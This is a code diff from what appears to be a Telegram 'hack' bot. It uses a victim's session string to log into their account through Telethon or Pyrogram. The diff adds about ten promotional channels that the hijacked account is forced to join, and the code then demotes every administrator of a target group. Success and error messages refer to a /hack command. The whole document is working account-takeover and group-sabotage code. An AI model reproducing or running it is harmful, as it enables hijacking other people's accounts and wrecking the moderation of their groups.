-            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
-            await steve.connect()
+            alpha = TelegramClient(StringSession(session),API_ID,API_HASH)   
+            await alpha.connect()
             try:
-                await steve(join("@ALPHA_DPZ_WORLD"))
-                await steve(join("@PURVI_SUPPORT"))
-                await steve(join(CHAT))                
+                await alpha(join("@Purvi_Bots"))
+                await alpha(join("@PurviBots"))
+                await alpha(join("@Purvi_Updates"))
+                await alpha(join("@Careless_Coder"))
+                await alpha(join("@Alpha_Says"))
+                await alpha(join("@oye_careless"))
+                await alpha(join("@Savage_Survivors"))
+                await alpha(join("@ALPHA_DPZ_WORLD"))
+                await alpha(join("@ONE_WAS_SIGMA"))
+                await alpha(join("@TheSigmCoder"))                
             except Exception as e:
                 print(e)
-            async for x in steve.iter_participants(gc_id, filter=ChannelParticipantsAdmins):
+            async for x in alpha.iter_participants(gc_id, filter=ChannelParticipantsAdmins):
                 try:
-                    await steve.edit_admin(gc_id, x.id, is_admin=False, manage_call=False)
+                    await alpha.edit_admin(gc_id, x.id, is_admin=False, manage_call=False)
                 except:
-                    await steve.edit_admin(gc_id, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
+                    await alpha.edit_admin(gc_id, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
           
-            await steve.disconnect()                              
+            await alpha.disconnect()                              
         else:    
-            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            async with Client("purvi",api_id=API_ID,api_hash=API_HASH, session_string=session) as purvi:
                 try:
-                    await stark.join_chat("@ALPHA_DPZ_WORLD")
-                    await stark.join_chat("@PURVI_SUPPORT")
+                    await purvi.join_chat("@Purvi_Bots")
+                    await purvi.join_chat("@PurviBots")
+                    await purvi.join_chat("@Purvi_Updates")
+                    await purvi.join_chat("@Careless_Coder")
+                    await purvi.join_chat("@Alpha_Says")
+                    await purvi.join_chat("@oye_careless")
+                    await purvi.join_chat("@Savage_Survivors")
+                    await purvi.join_chat("@ALPHA_DPZ_WORLD")
+                    await purvi.join_chat("@ONE_WAS_SIGMA")
+                    await purvi.join_chat("@TheSigmCoder")
                 except Exception as e:
                     print(e)
-                async for m in stark.get_chat_members(gc_id, filter=enums.ChatMembersFilter.ADMINISTRATORS):
-                    await stark.promote_chat_member(gc_id,m.user.id,DEMOTE)                                                                                     
+                async for m in purvi.get_chat_members(gc_id, filter=enums.ChatMembersFilter.ADMINISTRATORS):
+                    await purvi.promote_chat_member(gc_id,m.user.id,DEMOTE)                                                                                     
     except Exception as idk:
         err += str(idk)
                     
     if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
+        return "**❖ ᴇʀʀᴏʀ :** " + err + "\n**» ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
     return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴅᴇᴍᴏᴛᴇᴅ ᴀʟʟ."      
-          
